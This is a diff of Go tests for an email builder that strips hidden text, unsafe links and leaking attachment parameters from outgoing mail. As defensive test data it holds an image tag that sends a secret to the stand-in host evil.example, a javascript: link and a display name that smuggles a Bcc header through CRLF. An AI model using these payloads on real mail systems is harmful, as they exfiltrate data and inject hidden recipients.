@@ -89,15 +89,22 @@ func TestOutgoingHTMLHasNoHiddenCharacters(t *testing.T) {
 	requireTextEqualsHTML(t, p)
 }
 
-func TestOutgoingHTMLWithNothingToShowIsAnEmptyMessage(t *testing.T) {
-	for _, markup := range []string{`<!-- ` + secret + ` -->`, `<img src="https://evil.example/` + secret + `">` + "\n", "  \n"} {
-		raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: markup}, newContext())
-
-		require.Equal(t, "text/plain", mediaTypeOf(t, headerOf(t, raw.Data)), "there is no HTML part")
-		p := parsedOf(t, raw.Data)
-		require.Empty(t, p.HTML)
-		require.Empty(t, strings.TrimSpace(p.Text))
+// HTML that loses all of its content must not become an empty message with no
+// word to the agent that wrote it.
+func TestOutgoingHTMLWithNothingToShowIsRefused(t *testing.T) {
+	for _, c := range []mail.Compose{
+		{To: []string{"bob@x"}, HTMLBody: `<!-- ` + secret + ` -->`},
+		{To: []string{"bob@x"}, HTMLBody: `<img src="https://evil.example/` + secret + `">` + "\n"},
+		{To: []string{"bob@x"}, Body: "another text", HTMLBody: `<div hidden>x</div>`},
+	} {
+		raw, err := Build(c, newContext())
+		require.ErrorIs(t, err, ErrEmptyHTML, "%q", c.HTMLBody)
+		require.Nil(t, raw)
 	}
+
+	// Nothing was removed from HTML that is only white space.
+	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: "  \n"}, newContext())
+	require.Equal(t, "text/plain", mediaTypeOf(t, headerOf(t, raw.Data)), "there is no HTML part")
 }
 
 // A message has one text. With HTML, it is the text of the HTML, also when a
@@ -296,6 +303,233 @@ func TestOutgoingLinkIsMeasuredAsItIsWritten(t *testing.T) {
 	requireTextEqualsHTML(t, p)
 }
 
+// hrefsOf returns the href of each link of an HTML part, decoded.
+func hrefsOf(t *testing.T, markup string) []string {
+	t.Helper()
+	doc, err := parseHTML(markup)
+	require.NoError(t, err)
+	var out []string
+	var walk func(n *xhtml.Node)
+	walk = func(n *xhtml.Node) {
+		if href, ok := attributeValue(n, "href"); ok && n.Type == xhtml.ElementNode {
+			out = append(out, href)
+		}
+		for c := n.FirstChild; c != nil; c = c.NextSibling {
+			walk(c)
+		}
+	}
+	walk(doc)
+	return out
+}
+
+// A link goes out only as the text shows it, whatever form it had.
+func TestEveryOutgoingHrefIsInTheTextPart(t *testing.T) {
+	for name, href := range map[string]string{
+		"a plain link":          "https://example.com/a/b",
+		"a query":               "https://example.com/a?b=c&d=e",
+		"a fragment":            "https://example.com/a#b",
+		"a mailto link":         "mailto:bob@x?subject=hi&body=hello",
+		"a space":               "https://example.com/a b",
+		"round brackets":        "https://example.com/a(b)c",
+		"square brackets":       "https://example.com/a[b]c",
+		"a quote":               `https://example.com/a'b`,
+		"letters of a language": "https://example.com/\U00004F60\U0000597D?q=\U000000E9",
+		"a capital scheme":      "HTTPS://Example.COM/A",
+		"white space around":    "  https://example.com/a  ",
+		"a tab inside":          "https://exa\tmple.com/a",
+		"a hidden character":    "https://example.com/a\U0000200Bb",
+		"a tag character":       "https://example.com/a\U000E0041b",
+		"an escape":             "https://example.com/a%20b%2Fc",
+		"a user":                "https://someone@example.com/",
+		"a port":                "https://example.com:8443/a",
+		"an empty path":         "https://example.com",
+		"the longest shown":     "https://example.com/" + strings.Repeat("a", maxShownURL-len("https://example.com/")),
+	} {
+		t.Run(name, func(t *testing.T) {
+			markup := `<p>before</p><a href="` + strings.ReplaceAll(href, `"`, "&#34;") + `">more</a>`
+			raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: markup}, newContext())
+
+			p := parsedOf(t, raw.Data)
+			hrefs := hrefsOf(t, p.HTML)
+			require.Len(t, hrefs, 1, "%q", p.HTML)
+			require.Contains(t, p.Text, hrefs[0])
+			require.Zero(t, HiddenRunes(hrefs[0]))
+			requireTextEqualsHTML(t, p)
+		})
+	}
+}
+
+func TestOutgoingLinkThatTheTextDoesNotShowLosesItsHref(t *testing.T) {
+	for name, href := range map[string]string{
+		"one byte over the limit": "https://example.com/" + strings.Repeat("a", maxShownURL-len("https://example.com/")+1),
+		"a relative link":         "/a/b",
+		"another scheme":          "ftp://example.com/a",
+		"a script":                "javascript:alert(1)",
+	} {
+		t.Run(name, func(t *testing.T) {
+			raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, HTMLBody: `<a href="` + href + `">more</a>`}, newContext())
+
+			p := parsedOf(t, raw.Data)
+			require.Empty(t, hrefsOf(t, p.HTML), "%q", p.HTML)
+			require.Contains(t, p.Text, "more")
+		})
+	}
+}
+
+// linkURL is what the text shows, and normalizedURL is the whole url. Outgoing
+// HTML keeps a link only when the two are the same.
+func TestLinkURLIsTheNormalizedURLUpToTheLimit(t *testing.T) {
+	link := func(href string) *xhtml.Node {
+		return &xhtml.Node{Type: xhtml.ElementNode, Data: "a", Attr: []xhtml.Attribute{{Key: "href", Val: href}}}
+	}
+	short := "https://example.com/a b"
+	require.Equal(t, "https://example.com/a%20b", normalizedURL(link(short)))
+	require.Equal(t, normalizedURL(link(short)), linkURL(link(short)))
+
+	long := "https://example.com/" + strings.Repeat("a", maxShownURL)
+	require.Equal(t, long, normalizedURL(link(long)))
+	require.Empty(t, linkURL(link(long)))
+
+	require.Empty(t, normalizedURL(link("javascript:alert(1)")))
+	require.Empty(t, normalizedURL(&xhtml.Node{Type: xhtml.ElementNode, Data: "a"}))
+}
+
+func TestBuildKeepsOnlyTheCharsetOfAnAttachmentContentType(t *testing.T) {
+	const contentType = `text/plain; charset=utf-8; x-note="` + secret + `"; name="` + secret + `.txt"; format=flowed`
+
+	t.Run("a new attachment", func(t *testing.T) {
+		raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, Body: "hi", Attachments: []mail.OutgoingAttachment{
+			{Filename: "a.txt", ContentType: contentType, Data: []byte("x")},
+		}}, newContext())
+
+		require.NotContains(t, string(raw.Data), secret)
+		require.NotContains(t, string(raw.Data), "flowed")
+		require.Contains(t, string(raw.Data), "charset=utf-8")
+		p := parsedOf(t, raw.Data)
+		require.Len(t, p.Attachments, 1)
+		require.Equal(t, "text/plain", p.Attachments[0].ContentType)
+	})
+
+	t.Run("an attachment of the original", func(t *testing.T) {
+		bc := newContext()
+		bc.Original = originalMessage()
+		bc.OriginalAttachments = []mail.Attachment{{
+			AttachmentInfo: mail.AttachmentInfo{Filename: "a.txt", ContentType: contentType},
+			Data:           []byte("x"),
+		}}
+		raw := mustBuild(t, mail.Compose{ForwardOf: forwardOf(), To: []string{"dave@x"}, Body: "fyi", IncludeOriginalAttachments: true}, bc)
+
+		require.NotContains(t, string(raw.Data), secret)
+	})
+
+	t.Run("a type with no parameters", func(t *testing.T) {
+		raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, Body: "hi", Attachments: []mail.OutgoingAttachment{
+			{Filename: "a.pdf", ContentType: "application/pdf", Data: []byte("x")},
+		}}, newContext())
+
+		require.Contains(t, string(raw.Data), "Content-Type: application/pdf")
+	})
+}
+
+// OutgoingAttachments says what Build writes, so a preview can show the same
+// names.
+func TestOutgoingAttachmentsAreWhatBuildWrites(t *testing.T) {
+	const hidden = "\U0000200B\U000E0041"
+	bc := newContext()
+	bc.Original = originalMessage()
+	bc.OriginalAttachments = []mail.Attachment{
+		{AttachmentInfo: mail.AttachmentInfo{Filename: "pl" + hidden + "an.pdf", ContentType: "application/pdf"}, Data: []byte("1")},
+		{AttachmentInfo: mail.AttachmentInfo{Filename: "two\U00002028lines.pdf", ContentType: "application/pdf"}, Data: []byte("2")},
+		{AttachmentInfo: mail.AttachmentInfo{Filename: "\U00000645\U000006CC\U0000200C\U00000631.pdf", ContentType: "application/pdf"}, Data: []byte("3")},
+		{AttachmentInfo: mail.AttachmentInfo{Filename: "", ContentType: "application/pdf"}, Data: []byte("4")},
+		{AttachmentInfo: mail.AttachmentInfo{Filename: hidden, ContentType: "application/pdf"}, Data: []byte("5")},
+	}
+	c := mail.Compose{
+		ForwardOf: forwardOf(), To: []string{"dave@x"}, Body: "fyi", IncludeOriginalAttachments: true,
+		Attachments: []mail.OutgoingAttachment{
+			{Filename: "own.txt", ContentType: "text/plain", Data: []byte("6")},
+			{ContentType: "text/plain", Data: []byte("7")},
+		},
+	}
+
+	raw := mustBuild(t, c, bc)
+
+	var names []string
+	for _, a := range OutgoingAttachments(c, bc) {
+		names = append(names, a.Filename)
+	}
+	require.Equal(t, []string{
+		"plan.pdf", "two lines.pdf", "\U00000645\U000006CC\U0000200C\U00000631.pdf", "attachment", "attachment", "own.txt", "attachment",
+	}, names)
+	require.Equal(t, names, attachmentNames(parsedOf(t, raw.Data)))
+	require.Empty(t, c.Attachments[1].Filename, "Build does not change its arguments")
+}
+
+func TestOutgoingAttachmentsOfANewMessage(t *testing.T) {
+	require.Nil(t, OutgoingAttachments(mail.Compose{To: []string{"bob@x"}}, newContext()))
+}
+
+// A file name follows the same rule as a subject: the joiners that change how
+// letters look may stay.
+func TestAttachmentNameWithJoinersOfAScriptThatNeedsThem(t *testing.T) {
+	persian := "\U00000645\U000006CC\U0000200C\U00000631\U00000648\U00000645.pdf"
+	raw := mustBuild(t, mail.Compose{To: []string{"dave@x"}, Attachments: []mail.OutgoingAttachment{
+		{Filename: persian, ContentType: "application/pdf", Data: []byte("x")},
+	}}, newContext())
+	require.Equal(t, []string{persian}, attachmentNames(parsedOf(t, raw.Data)))
+
+	_, err := Build(mail.Compose{To: []string{"dave@x"}, Attachments: []mail.OutgoingAttachment{
+		{Filename: "a\U0000200Cb.pdf", ContentType: "application/pdf", Data: []byte("x")},
+	}}, newContext())
+	require.ErrorIs(t, err, ErrInvalidFilename, "between Latin letters it changes nothing that a reader sees")
+}
+
+func TestVisibleFormatCharactersGoOut(t *testing.T) {
+	text := "\U000006DD\U00000661 \U00000600\U00000661"
+	raw := mustBuild(t, mail.Compose{To: []string{"bob@x"}, Subject: text, Body: text}, newContext())
+	require.Equal(t, text, parsedOf(t, raw.Data).Text)
+	require.Equal(t, text, DecodeHeaderValue(headerOf(t, raw.Data).Get("Subject")))
+
+	for _, mark := range []string{"\U0000200E", "\U0000200F", "\U0000061C"} {
+		_, err := Build(mail.Compose{To: []string{"bob@x"}, Subject: "a" + mark}, newContext())
+		require.ErrorIs(t, err, ErrHiddenText, "a direction mark cannot be seen")
+	}
+}
+
+func TestBuildReportsTheDisplayNamesOfTheRecipients(t *testing.T) {
+	t.Run("a new message", func(t *testing.T) {
+		raw := mustBuild(t, mail.Compose{
+			To:  []string{"Bob <bob@x>", "ann@x"},
+			Cc:  []string{"Carol Smith <carol@x>"},
+			Bcc: []string{"Dan <dan@x>"},
+			// An address that is in To already stays there, with the first name.
+			Subject: "S", Body: "hi",
+		}, newContext())
+
+		require.Equal(t, []string{"bob@x", "ann@x", "carol@x", "dan@x"}, raw.Recipients)
+		require.Equal(t, []string{"Bob", "", "Carol Smith", "Dan"}, raw.Names)
+	})
+
+	t.Run("a reply to all has the cleaned names of the original", func(t *testing.T) {
+		bc := newContext()
+		bc.Original = originalMessage()
+		bc.Original.From.Name = "Ali\U0000200Bce\r\nBcc: evil@x"
+		bc.Original.To = []mail.Address{{Name: "Bo\U000E0041b", Email: "bob@x"}, {Email: "me@x"}}
+		raw := mustBuild(t, mail.Compose{ReplyTo: replyTo(true), Body: "Yes."}, bc)
+
+		require.Equal(t, []string{"alice@x", "bob@x", "carol@x"}, raw.Recipients)
+		require.Equal(t, []string{"Alice Bcc: evil@x", "Bob", ""}, raw.Names)
+	})
+
+	t.Run("a draft has the names of its headers, Bcc too", func(t *testing.T) {
+		raw, err := FromDraft([]byte("From: Me <me@x>\r\nTo: Ann <ann@x>, bob@x\r\nCc: Carol <carol@x>\r\nBcc: Dan <dan@x>\r\n\r\nhi\r\n"))
+		require.NoError(t, err)
+
+		require.Equal(t, []string{"ann@x", "bob@x", "carol@x", "dan@x"}, raw.Recipients)
+		require.Equal(t, []string{"Ann", "", "Carol", "Dan"}, raw.Names)
+	})
+}
+
 // The main rule for any markup: what goes out holds no comment, no attribute
 // that can carry data, no element that a reader does not see, and no link that
 // the text does not show.
@@ -340,10 +574,10 @@ func FuzzOutgoingHTML(f *testing.F) {
 				for _, a := range n.Attr {
 					require.Contains(t, []string{"href", "rel"}, a.Key, "%q", out)
 				}
-				if _, ok := attributeValue(n, "href"); ok {
-					url := linkURL(n)
-					require.NotEmpty(t, url, "%q", out)
-					require.Contains(t, text, url, "%q", out)
+				if href, ok := attributeValue(n, "href"); ok {
+					require.NotEmpty(t, href, "%q", out)
+					require.Equal(t, href, linkURL(n), "%q", out)
+					require.Contains(t, text, href, "%q", out)
 				}
 			}
 			for c := n.FirstChild; c != nil; c = c.NextSibling {
